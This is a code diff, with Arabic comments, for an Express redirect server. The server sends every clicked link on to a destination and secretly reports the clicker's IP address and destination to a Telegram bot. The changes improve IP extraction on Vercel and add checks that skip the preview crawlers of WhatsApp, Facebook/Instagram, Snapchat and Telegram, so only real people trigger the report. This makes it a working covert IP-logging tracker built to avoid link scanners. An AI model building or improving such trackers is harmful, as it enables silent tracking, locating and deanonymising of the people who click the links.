@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 1. تجاهل طلبات الأيقونات وملفات النظام تلقائياً لمنع التكرار
+// 1. تجاهل طلبات الأيقونات وملفات النظام تلقائياً
 app.use((req, res, next) => {
     if (req.url.includes('favicon.ico') || req.url.includes('robots.txt')) {
         return res.status(204).end();
@@ -11,7 +11,11 @@ app.use((req, res, next) => {
 });
 
 app.get('*', async (req, res) => {
-    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // التعديل الأول: جلب الآي بي الحقيقي والصافي للزائر (مخصص لـ Vercel)
+    const xRealIp = req.headers['x-real-ip'];
+    const xForwardedFor = req.headers['x-forwarded-for'];
+    const visitorIp = xRealIp || (xForwardedFor ? xForwardedFor.split(',')[0].trim() : req.socket.remoteAddress);
+
     const to = req.query.to; 
     const path = req.path;
 
@@ -38,16 +42,22 @@ app.get('*', async (req, res) => {
     // التوجيه الفوري
     res.redirect(302, targetUrl);
 
-    // 2. إرسال التنبيه بشرط أن يكون الزائر حقيقياً (ليس بوت)
+    // التعديل الثاني: قائمة حظر شاملة لبوتات فحص الروابط من التطبيقات
     const userAgent = (req.headers['user-agent'] || '').toLowerCase();
-    const isBot = userAgent.includes('bot') || userAgent.includes('spider') || userAgent.includes('crawl');
+    const isBot = userAgent.includes('bot') || 
+                  userAgent.includes('spider') || 
+                  userAgent.includes('crawl') ||
+                  userAgent.includes('facebookexternalhit') || // يمنع سيرفرات انستغرام وفيسبوك
+                  userAgent.includes('whatsapp') ||            // يمنع سيرفرات واتساب
+                  userAgent.includes('snapchat') ||            // يمنع سيرفرات سناب شات
+                  userAgent.includes('telegram') ||            // يمنع سيرفرات تليجرام
+                  userAgent.includes('vercel');                // يمنع فحص سيرفرات Vercel
 
     if (!isBot && visitorIp) {
         const token = process.env.TELEGRAM_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
         
         if (token && chatId) {
-            // استخدام fetch بشكل آمن
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`🚨 New Visitor!\nTo: ${destinationName}\nIP: ${visitorIp}`)}`)
             .catch(() => {});
         }
